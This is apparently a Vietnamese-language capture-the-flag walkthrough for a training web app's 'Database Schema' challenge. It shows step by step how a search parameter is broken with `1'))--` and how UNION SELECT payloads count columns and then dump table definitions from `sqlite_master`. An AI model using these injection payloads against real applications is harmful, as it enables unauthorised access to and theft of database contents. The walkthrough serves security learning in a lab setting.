# Database Schema

- **Vulnerability**: Injection
- **Difficult Level**: 3/6
- **Description**: Exfiltrate the entire DB schema definition via SQL Injection.

---
## Tìm syntax payload đúng
Thử cố gắng inject các giá trị không hợp lệ:
```
search?q='
```
<img width="1029" height="530" alt="image" src="https://github.com/user-attachments/assets/79c8cefb-e913-4274-9b98-f844fcc4cfd8" />
Nó vẫn trả về đúng.


Thử payload khác:
```
search?q=1'
```
<img width="1030" height="531" alt="image" src="https://github.com/user-attachments/assets/15a77904-84d1-4ca3-9bf0-c572959340ae" />
Request trả về có cả câu SQL:
```
SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name
```


Muốn phá vỡ đoạn đằng sau ta sẽ inject theo dạng: `abcxyz'))--`
Khi đó câu SQL sẽ biến thành:
```
SELECT * FROM Products WHERE ((name LIKE '%abcxyz'))--%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name
```
và toàn bộ phần sau dấu `--` sẽ biến thành comment


Thử để chắc chắn payload đúng:
```
search?q=1'))--
```
<img width="1030" height="530" alt="image" src="https://github.com/user-attachments/assets/29537b24-df5c-4998-bb8f-778c63184850" />

Từ bây giờ ta sẽ inject để lấy data

## Lấy số cột để thực hiện UNION
Để ý nếu ta union với phép SELECT không đủ số cột, nó sẽ trả về lỗi:

"SELECTs to the left and right of UNION do not have the same number of result columns"
<img width="1028" height="531" alt="image" src="https://github.com/user-attachments/assets/391553a7-2359-4faf-9814-a707155d4719" />

Lỗi này xảy ra khi hai phép SELECT được hợp với nhau bởi UNION không có số cột bằng nhau. Để tránh lỗi này, ta phải thử bừa để tìm được số cột:

Payload:
```
search?q=1')) union select 1,2,3,4,5,6,7,8,9--
```
<img width="1030" height="531" alt="image" src="https://github.com/user-attachments/assets/f788cdb9-6324-4a9e-9551-a6deb63bc5c9" />

# Trích xuất schema
Do ta biết được web sử dụng SQLite server, mà trong `sqlite_master` (system table của SQLite), có 1 cột tên là `sql` chứa câu lệnh CREATE của tất cả các bảng.

CREATE = schema của các bảng

Payload:
```
search?q=1')) union select 1,2,3,4,5,6,7,8,sql from sqlite_master--
```
<img width="1028" height="527" alt="image" src="https://github.com/user-attachments/assets/9b0493af-5745-40d8-9aa5-f444d408302f" />

Quay lại tab proxy, inject payload này vào request và gửi request đi là xong challenges!
